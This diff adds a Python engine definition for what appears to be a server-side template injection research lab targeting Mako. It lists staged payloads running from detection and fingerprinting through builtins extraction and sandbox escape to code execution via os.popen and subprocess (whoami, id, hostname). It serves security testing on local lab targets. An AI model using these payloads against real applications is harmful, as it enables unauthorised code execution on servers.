@@ -1,0 +1,177 @@
+"""Mako engine definition for RENDER SSTI research platform."""
+
+from engines.base import TemplateEngine, ProbePayload
+
+
+class MakoEngine(TemplateEngine):
+    """Mako template engine attack surface (Python)."""
+
+    def __init__(self) -> None:
+        super().__init__(
+            name="mako",
+            language="python",
+            framework="Pyramid/standalone",
+            default_vulnerable_url="http://127.0.0.1:5003",
+            default_hardened_url="http://127.0.0.1:5004",
+            detection_probes=[
+                ProbePayload(
+                    id="mako-detect-001",
+                    name="Math Evaluation Probe",
+                    stage="detection",
+                    payload="${7*7}",
+                    expected="49",
+                    explanation="Mako evaluates ${7*7} using Python's eval; result is 49.",
+                    safety_scope="local_lab_only",
+                ),
+                ProbePayload(
+                    id="mako-detect-002",
+                    name="String Multiplication Probe",
+                    stage="detection",
+                    payload="${'abc'*3}",
+                    expected="abcabcabc",
+                    explanation="Mako evaluates Python string repetition.",
+                    safety_scope="local_lab_only",
+                ),
+                ProbePayload(
+                    id="mako-detect-003",
+                    name="Addition Probe",
+                    stage="detection",
+                    payload="${41+1}",
+                    expected="42",
+                    explanation="Addition probe confirms Mako expression evaluation.",
+                    safety_scope="local_lab_only",
+                ),
+            ],
+            fingerprint_probes=[
+                ProbePayload(
+                    id="mako-fp-001",
+                    name="Self Class",
+                    stage="fingerprinting",
+                    payload="${self.__class__}",
+                    expected="Template",
+                    explanation="Mako's self refers to the template object.",
+                    safety_scope="local_lab_only",
+                ),
+                ProbePayload(
+                    id="mako-fp-002",
+                    name="Self Module",
+                    stage="fingerprinting",
+                    payload="${self.module}",
+                    expected="mako",
+                    explanation="Mako templates are compiled to Python modules; self.module exposes it.",
+                    safety_scope="local_lab_only",
+                ),
+                ProbePayload(
+                    id="mako-fp-003",
+                    name="Context Keys",
+                    stage="fingerprinting",
+                    payload="${list(context.keys())}",
+                    expected="context",
+                    explanation="Mako context object is accessible as 'context' inside templates.",
+                    safety_scope="local_lab_only",
+                ),
+                ProbePayload(
+                    id="mako-fp-004",
+                    name="Caller Body Check",
+                    stage="fingerprinting",
+                    payload="${caller.body()}",
+                    expected="caller",
+                    explanation="caller.body() is a Mako-specific construct for def-based inheritance.",
+                    safety_scope="local_lab_only",
+                ),
+            ],
+            extract_payloads=[
+                ProbePayload(
+                    id="mako-ext-001",
+                    name="Dir Self",
+                    stage="extraction",
+                    payload="${dir(self)}",
+                    expected="module",
+                    explanation="Lists all attributes on Mako's self object.",
+                    safety_scope="local_lab_only",
+                ),
+                ProbePayload(
+                    id="mako-ext-002",
+                    name="Self Dict",
+                    stage="extraction",
+                    payload="${self.__dict__}",
+                    expected="callstack",
+                    explanation="Dumps the template instance's __dict__.",
+                    safety_scope="local_lab_only",
+                ),
+                ProbePayload(
+                    id="mako-ext-003",
+                    name="Module Builtins",
+                    stage="extraction",
+                    payload="${self.module.__builtins__}",
+                    expected="__import__",
+                    explanation="Accesses Python builtins through the compiled module object.",
+                    safety_scope="local_lab_only",
+                ),
+                ProbePayload(
+                    id="mako-ext-004",
+                    name="Globals via module",
+                    stage="extraction",
+                    payload="${self.module.__dict__}",
+                    expected="__builtins__",
+                    explanation="Dumps the compiled module's global namespace.",
+                    safety_scope="local_lab_only",
+                ),
+            ],
+            escape_payloads=[
+                ProbePayload(
+                    id="mako-esc-001",
+                    name="Module Builtins Import",
+                    stage="escape",
+                    payload="${self.module.__builtins__['__import__']('os')}",
+                    expected="posix",
+                    explanation="Uses builtins dict to import os module.",
+                    safety_scope="local_lab_only",
+                ),
+                ProbePayload(
+                    id="mako-esc-002",
+                    name="Direct Import",
+                    stage="escape",
+                    payload="${__import__('os')}",
+                    expected="posix",
+                    explanation="Direct __import__ call works in Mako expression blocks.",
+                    safety_scope="local_lab_only",
+                ),
+            ],
+            rce_payloads=[
+                ProbePayload(
+                    id="mako-rce-001",
+                    name="RCE via __import__ popen (whoami)",
+                    stage="rce",
+                    payload="${__import__('os').popen('whoami').read()}",
+                    expected="whoami_output",
+                    explanation="Direct os.popen() call through __import__ in Mako expression.",
+                    safety_scope="local_lab_only",
+                ),
+                ProbePayload(
+                    id="mako-rce-002",
+                    name="RCE via module builtins (id)",
+                    stage="rce",
+                    payload="${self.module.__builtins__['__import__']('os').popen('id').read()}",
+                    expected="uid=",
+                    explanation="Reaches os.popen through the compiled module's builtins dict.",
+                    safety_scope="local_lab_only",
+                ),
+                ProbePayload(
+                    id="mako-rce-003",
+                    name="RCE via subprocess (hostname)",
+                    stage="rce",
+                    payload=(
+                        "${__import__('subprocess').check_output(['hostname'],"
+                        "stderr=__import__('subprocess').STDOUT).decode()}"
+                    ),
+                    expected="hostname_output",
+                    explanation="Uses subprocess.check_output for hostname retrieval.",
+                    safety_scope="local_lab_only",
+                ),
+            ],
+        )
+
+    def check_fingerprint(self, response_text: str) -> bool:
+        markers = ["Template", "mako", "callstack", "context"]
+        return any(m.lower() in response_text.lower() for m in markers)
